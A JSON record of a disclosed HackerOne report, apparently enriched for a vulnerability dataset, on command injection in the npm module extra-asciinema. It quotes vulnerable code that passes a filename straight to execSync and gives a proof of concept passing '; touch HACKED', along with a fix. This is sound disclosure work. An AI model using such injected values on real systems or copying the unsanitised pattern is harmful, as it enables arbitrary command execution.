{
  "reported_to": "Node.js third-party modules",
  "reported_by": "d3lla ",
  "title": "[extra-asciinema] Command Injection via insecure command formatting",
  "content": "\nI would like to report a Command Injection issue in the extra-asciinema module.\nIt allows to execute arbitrary commands on the victim's PC.\nModule\nmodule name: extra-asciinema\nversion: 1.0.5\nnpm page: https://www.npmjs.com/package/extra-asciinema\nModule Description\nasciinema is a terminal screen recorder.\nWith this package you can auto-generate terminal recordings for Node.js examples through asciinema programmatically. Each method is also available as separate package for use by bundling tools, like browserify, rollup, uglify-js.\nModule Stats\n[23] weekly downloads\nVulnerability\nVulnerability Description\nThe issue occurs because a user input parameter is used inside a command that is executed without any check.\nI tested the uploadSync function.\nHere's the code which causes the issue:\nCode 398 Bytes\n1// https://github.com/nodef/extra-asciinema/blob/master/index.js#L214\n2...\n3const cp9 = require('child_process');\n4...\n5/**\n6 * Upload recorded asciicast to asciinema.org site.\n7 * @param {string} f filename\n8 * @returns {string} asciicast URL\n9 */\n10function uploadSync(f) {\n11  var stdout = cp9.execSync(`asciinema upload ${f}`, {encoding: 'utf8'});\n12  return stdout.replace(/.*?(https?:\\S+).*/s, '$1');\n13}\n14...\nThe f parameter is used to build the command that is passed to the child_process.execSync function without any check.\nSteps To Reproduce:\ncreate a directory for testing\nmkdir poc\ncd poc/\nmkdir poc\ncd poc/\ninstall extra-asciinema module:\nnpm i extra-asciinema\nnpm i extra-asciinema\ncreate the following PoC JavaScript file (poc.js):\nCode 86 Bytes\n1const asciinema = require('extra-asciinema');\n2asciinema.uploadSync('; touch HACKED');\n3\nmake sure that the HACKED file does not exist:\nls\nls\nexecute the poc.js file:\nnode poc.js\nnode poc.js\nthe HACKED file is created:\nls\nls\nPatch\nDo not concatenate/format commands using insecure user's input. Always check and sanitize it.\nIn my opinion, it's better to use child_process.execFileSync or child_process.spawnSync functions instead of child_process.execSync.\nSupporting Material/References:\nOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\nNODEJS VERSION: v13.13.0\nNPM VERSION: 6.14.4\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nThank you for your time.\nbest regards,\nd3lla\nImpact\nCommand Injection on extra-asciinema module via insecure command formatting.\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Command Injection - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1598100480,
  "report_url": "https://hackerone.com/reports/863956",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the extra-asciinema module: npm i extra-asciinema"
    ],
    [
      2,
      "Create a PoC file (poc.js) with the following content: const asciinema = require('extra-asciinema'); asciinema.uploadSync('; touch HACKED');"
    ],
    [
      3,
      "Execute the PoC file: node poc.js"
    ],
    [
      4,
      "Verify the creation of the HACKED file: ls"
    ]
  ],
  "vuln_description": "The vulnerability is a command injection issue in the extra-asciinema module where user input is directly used in a command executed via child_process.execSync without any sanitization, allowing arbitrary command execution.",
  "reason": "The vulnerability is straightforward to discover as it involves a common pattern of insecure command construction with user input. The attack does not require multiple components, complex state manipulation, or novel logic.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via insecure command formatting in the extra-asciinema module, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on detecting AuthN/AuthZ bypasses and IDOR vulnerabilities by analyzing user sessions and resource access patterns, which are not applicable to command injection vulnerabilities.",
    "is_detectable": false
  }
}